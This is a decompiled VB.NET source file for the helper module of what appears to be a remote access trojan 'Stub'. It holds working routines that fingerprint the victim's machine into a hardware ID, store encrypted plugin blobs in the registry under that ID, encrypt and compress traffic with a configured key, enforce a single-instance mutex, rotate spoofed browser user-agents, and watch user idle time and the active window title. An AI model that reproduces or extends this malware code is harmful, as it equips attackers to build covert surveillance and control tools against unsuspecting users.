Imports System
Imports System.Diagnostics
Imports System.IO
Imports System.IO.Compression
Imports System.Runtime.CompilerServices
Imports System.Runtime.InteropServices
Imports System.Security.Cryptography
Imports System.Text
Imports System.Threading
Imports Microsoft.VisualBasic.CompilerServices
Imports Microsoft.Win32

Namespace Stub
	' Token: 0x02000013 RID: 19
	Friend NotInheritable Module Helper
		' Token: 0x0600006A RID: 106 RVA: 0x000060D0 File Offset: 0x000042D0
		Public Function GetRandomString(length As Integer) As String
			Dim stringBuilder As StringBuilder = New StringBuilder(length)
			Dim num As Integer = 0
			Dim num2 As Integer = length - 1
			For i As Integer = num To num2
				stringBuilder.Append("abcdefghijklmnopqrstuvwxyz"(Helper.Random.[Next]("abcdefghijklmnopqrstuvwxyz".Length)))
			Next
			Return stringBuilder.ToString()
		End Function

		' Token: 0x0600006B RID: 107
		Public Declare Function GetLastInputInfo Lib "user32.dll" (ByRef plii As Helper.LASTINPUTINFO) As Boolean

		' Token: 0x0600006C RID: 108 RVA: 0x00006124 File Offset: 0x00004324
		Public Function GetLastInputTime() As Integer
			Helper.idletime = 0
			Helper.lastInputInf.cbSize = Marshal.SizeOf(Of Helper.LASTINPUTINFO)(Helper.lastInputInf)
			Helper.lastInputInf.dwTime = 0
			If Helper.GetLastInputInfo(Helper.lastInputInf) Then
				Helper.idletime = Environment.TickCount - Helper.lastInputInf.dwTime
			End If
			Dim result As Integer
			If Helper.idletime > 0 Then
				result = CInt(Math.Round(CDbl(Helper.idletime) / 1000.0))
			Else
				result = 0
			End If
			Return result
		End Function

		' Token: 0x0600006D RID: 109 RVA: 0x000061A0 File Offset: 0x000043A0
		Public Function LastAct() As Object
			While True
				Thread.Sleep(1000)
				Dim lastInputTime As Integer = Helper.GetLastInputTime()
				If Helper.LastLastIdletime > lastInputTime Then
					Helper.sumofidletime = Helper.sumofidletime.Add(TimeSpan.FromSeconds(CDbl(Helper.LastLastIdletime)))
				Else
					Helper.Time = Conversions.ToString(Helper.GetLastInputTime())
				End If
				Helper.LastLastIdletime = lastInputTime
			End While
			Dim result As Object
			Return result
		End Function

		' Token: 0x0600006E RID: 110
		Public Declare Function GetForegroundWindow Lib "user32.dll" () As IntPtr

		' Token: 0x0600006F RID: 111
		Public Declare Function GetWindowText Lib "user32.dll" (hWnd As IntPtr, text As StringBuilder, count As Integer) As Integer

		' Token: 0x06000070 RID: 112
		Public Declare Function SetThreadExecutionState Lib "kernel32.dll" (esFlags As Helper.EXECUTION_STATE) As Helper.EXECUTION_STATE

		' Token: 0x06000071 RID: 113 RVA: 0x000061FC File Offset: 0x000043FC
		Public Sub PreventSleep()
			Try
				Helper.SetThreadExecutionState(CType(2147483651UI, Helper.EXECUTION_STATE))
			Catch ex As Exception
			End Try
		End Sub

		' Token: 0x06000072 RID: 114 RVA: 0x00006234 File Offset: 0x00004434
		Public Function GetActiveWindowTitle() As String
			Try
				Dim stringBuilder As StringBuilder = New StringBuilder(256)
				Dim foregroundWindow As IntPtr = Helper.GetForegroundWindow()
				If Helper.GetWindowText(foregroundWindow, stringBuilder, 256) > 0 Then
					Return stringBuilder.ToString()
				End If
			Catch ex As Exception
			End Try
			Return ""
		End Function

		' Token: 0x06000073 RID: 115 RVA: 0x00006294 File Offset: 0x00004494
		Public Function SB(s As String) As Byte()
			Return Encoding.[Default].GetBytes(s)
		End Function

		' Token: 0x06000074 RID: 116 RVA: 0x000062B0 File Offset: 0x000044B0
		Public Function BS(b As Byte()) As String
			Return Encoding.[Default].GetString(b)
		End Function

		' Token: 0x06000075 RID: 117 RVA: 0x000062CC File Offset: 0x000044CC
		Public Function ID() As String
			Dim result As String
			Try
				result = Helper.GetHashT(String.Concat(New Object() { Environment.ProcessorCount, Environment.UserName, Environment.MachineName, Environment.OSVersion, New DriveInfo(Path.GetPathRoot(Environment.SystemDirectory)).TotalSize }))
			Catch ex As Exception
				result = "Err HWID"
			End Try
			Return result
		End Function

		' Token: 0x06000076 RID: 118 RVA: 0x0000635C File Offset: 0x0000455C
		Public Function GetHashT(strToHash As String) As String
			Dim md5CryptoServiceProvider As MD5CryptoServiceProvider = New MD5CryptoServiceProvider()
			Dim array As Byte() = Encoding.ASCII.GetBytes(strToHash)
			array = md5CryptoServiceProvider.ComputeHash(array)
			Dim stringBuilder As StringBuilder = New StringBuilder()
			For Each b As Byte In array
				stringBuilder.Append(b.ToString("x2"))
			Next
			Return stringBuilder.ToString().Substring(0, 20).ToUpper()
		End Function

		' Token: 0x06000077 RID: 119 RVA: 0x000063D0 File Offset: 0x000045D0
		Public Function SetValue(name As String, value As Byte()) As Boolean
			Try
				Using registryKey As RegistryKey = Registry.CurrentUser.CreateSubKey(Helper.Plugin, RegistryKeyPermissionCheck.ReadWriteSubTree)
					registryKey.SetValue(name, value, RegistryValueKind.Binary)
					Return True
				End Using
			Catch ex As Exception
			End Try
			Return False
		End Function

		' Token: 0x06000078 RID: 120 RVA: 0x00006438 File Offset: 0x00004638
		Public Function GetValue(value As String) As Byte()
			Try
				Using registryKey As RegistryKey = Registry.CurrentUser.CreateSubKey(Helper.Plugin)
					Dim objectValue As Object = RuntimeHelpers.GetObjectValue(registryKey.GetValue(value))
					Return CType(objectValue, Byte())
				End Using
			Catch ex As Exception
			End Try
			Return Nothing
		End Function

		' Token: 0x06000079 RID: 121 RVA: 0x000064A8 File Offset: 0x000046A8
		Public Function Decompress(input As Byte()) As Byte()
			Dim result As Byte()
			Using obj As Object = New MemoryStream(input)
				Dim array As Byte() = New Byte(3) {}
				Dim instance As Object = obj
				Dim type As Type = Nothing
				Dim memberName As String = "Read"
				Dim array2 As Object() = New Object() { array, 0, 4 }
				Dim arguments As Object() = array2
				Dim argumentNames As String() = Nothing
				Dim typeArguments As Type() = Nothing
				Dim array3 As Boolean() = New Boolean() { True, False, False }
				NewLateBinding.LateCall(instance, type, memberName, arguments, argumentNames, typeArguments, array3, True)
				If array3(0) Then
					array = CType(Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array2(0)), GetType(Byte())), Byte())
				End If
				Dim obj2 As Object = BitConverter.ToInt32(array, 0)
				Using obj3 As Object = New GZipStream(CType(obj, Stream), CompressionMode.Decompress)
					' The following expression was wrapped in a checked-expression
					Dim obj4 As Object = New Byte(Conversions.ToInteger(Operators.SubtractObject(obj2, 1)) + 1 - 1) {}
					Dim instance2 As Object = obj3
					Dim type2 As Type = Nothing
					Dim memberName2 As String = "Read"
					Dim array4 As Object() = New Object() { RuntimeHelpers.GetObjectValue(obj4), 0, RuntimeHelpers.GetObjectValue(obj2) }
					Dim arguments2 As Object() = array4
					Dim argumentNames2 As String() = Nothing
					Dim typeArguments2 As Type() = Nothing
					array3 = New Boolean() { True, False, True }
					NewLateBinding.LateCall(instance2, type2, memberName2, arguments2, argumentNames2, typeArguments2, array3, True)
					If array3(0) Then
						obj4 = RuntimeHelpers.GetObjectValue(array4(0))
					End If
					If array3(2) Then
						obj2 = RuntimeHelpers.GetObjectValue(array4(2))
					End If
					result = CType(obj4, Byte())
				End Using
			End Using
			Return result
		End Function

		' Token: 0x0600007A RID: 122 RVA: 0x00006648 File Offset: 0x00004848
		Public Function Compress(input As Byte()) As Byte()
			Dim result As Byte()
			Using obj As Object = New MemoryStream()
				Dim obj2 As Object = BitConverter.GetBytes(input.Length)
				Dim instance As Object = obj
				Dim type As Type = Nothing
				Dim memberName As String = "Write"
				Dim array As Object() = New Object() { RuntimeHelpers.GetObjectValue(obj2), 0, 4 }
				Dim arguments As Object() = array
				Dim argumentNames As String() = Nothing
				Dim typeArguments As Type() = Nothing
				Dim array2 As Boolean() = New Boolean() { True, False, False }
				NewLateBinding.LateCall(instance, type, memberName, arguments, argumentNames, typeArguments, array2, True)
				If array2(0) Then
					obj2 = RuntimeHelpers.GetObjectValue(array(0))
				End If
				Using obj3 As Object = New GZipStream(CType(obj, Stream), CompressionMode.Compress)
					Dim instance2 As Object = obj3
					Dim type2 As Type = Nothing
					Dim memberName2 As String = "Write"
					Dim array3 As Object() = New Object() { input, 0, input.Length }
					Dim arguments2 As Object() = array3
					Dim argumentNames2 As String() = Nothing
					Dim typeArguments2 As Type() = Nothing
					array2 = New Boolean() { True, False, False }
					NewLateBinding.LateCall(instance2, type2, memberName2, arguments2, argumentNames2, typeArguments2, array2, True)
					If array2(0) Then
						input = CType(Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array3(0)), GetType(Byte())), Byte())
					End If
					NewLateBinding.LateCall(obj3, Nothing, "Flush", New Object(-1) {}, Nothing, Nothing, Nothing, True)
				End Using
				result = CType(NewLateBinding.LateGet(obj, Nothing, "ToArray", New Object(-1) {}, Nothing, Nothing, Nothing), Byte())
			End Using
			Return result
		End Function

		' Token: 0x0600007B RID: 123 RVA: 0x000067D8 File Offset: 0x000049D8
		Public Function AES_Encryptor(input As Byte()) As Byte()
			Dim rijndaelManaged As RijndaelManaged = New RijndaelManaged()
			Dim md5CryptoServiceProvider As MD5CryptoServiceProvider = New MD5CryptoServiceProvider()
			Dim result As Byte()
			Try
				rijndaelManaged.Key = md5CryptoServiceProvider.ComputeHash(Helper.SB(Settings.KEY))
				rijndaelManaged.Mode = CipherMode.ECB
				Dim cryptoTransform As ICryptoTransform = rijndaelManaged.CreateEncryptor()
				result = cryptoTransform.TransformFinalBlock(input, 0, input.Length)
			Catch ex As Exception
			End Try
			Return result
		End Function

		' Token: 0x0600007C RID: 124 RVA: 0x0000684C File Offset: 0x00004A4C
		Public Function AES_Decryptor(input As Byte()) As Byte()
			Dim rijndaelManaged As RijndaelManaged = New RijndaelManaged()
			Dim md5CryptoServiceProvider As MD5CryptoServiceProvider = New MD5CryptoServiceProvider()
			Dim result As Byte()
			Try
				rijndaelManaged.Key = md5CryptoServiceProvider.ComputeHash(Helper.SB(Settings.KEY))
				rijndaelManaged.Mode = CipherMode.ECB
				Dim cryptoTransform As ICryptoTransform = rijndaelManaged.CreateDecryptor()
				result = cryptoTransform.TransformFinalBlock(input, 0, input.Length)
			Catch ex As Exception
			End Try
			Return result
		End Function

		' Token: 0x0600007D RID: 125 RVA: 0x000068C0 File Offset: 0x00004AC0
		Public Function CreateMutex() As Boolean
			Dim result As Boolean
			Helper._appMutex = New Mutex(False, Settings.Mutex, result)
			Return result
		End Function

		' Token: 0x0600007E RID: 126 RVA: 0x000068E4 File Offset: 0x00004AE4
		Public Sub CloseMutex()
			If Helper._appMutex IsNot Nothing Then
				Helper._appMutex.Close()
				Helper._appMutex = Nothing
			End If
		End Sub

		' Token: 0x0400002D RID: 45
		Public fileStream As FileStream

		' Token: 0x0400002E RID: 46
		Private Const Alphabet As String = "abcdefghijklmnopqrstuvwxyz"

		' Token: 0x0400002F RID: 47
		Public Random As Random = New Random()

		' Token: 0x04000030 RID: 48
		Private Plugin As String = "Software\" + Helper.ID()

		' Token: 0x04000031 RID: 49
		Public current As String = Process.GetCurrentProcess().MainModule.FileName

		' Token: 0x04000032 RID: 50
		Private idletime As Integer

		' Token: 0x04000033 RID: 51
		Private lastInputInf As Helper.LASTINPUTINFO = Nothing

		' Token: 0x04000034 RID: 52
		Public sumofidletime As TimeSpan = New TimeSpan(0L)

		' Token: 0x04000035 RID: 53
		Public LastLastIdletime As Integer

		' Token: 0x04000036 RID: 54
		Public Time As String

		' Token: 0x04000037 RID: 55
		Public userAgents As String() = New String() { "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:66.0) Gecko/20100101 Firefox/66.0", "Mozilla/5.0 (iPhone; CPU iPhone OS 11_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/11.0 Mobile/15E148 Safari/604.1", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36" }

		' Token: 0x04000038 RID: 56
		Public _appMutex As Mutex

		' Token: 0x02000017 RID: 23
		Public Structure LASTINPUTINFO
			' Token: 0x0400003C RID: 60
			<MarshalAs(UnmanagedType.U4)>
			Public cbSize As Integer

			' Token: 0x0400003D RID: 61
			<MarshalAs(UnmanagedType.U4)>
			Public dwTime As Integer
		End Structure

		' Token: 0x02000018 RID: 24
		Public Enum EXECUTION_STATE As UInteger
			' Token: 0x0400003F RID: 63
			ES_CONTINUOUS = 2147483648UI
			' Token: 0x04000040 RID: 64
			ES_DISPLAY_REQUIRED = 2UI
			' Token: 0x04000041 RID: 65
			ES_SYSTEM_REQUIRED = 1UI
		End Enum
	End Module
End Namespace
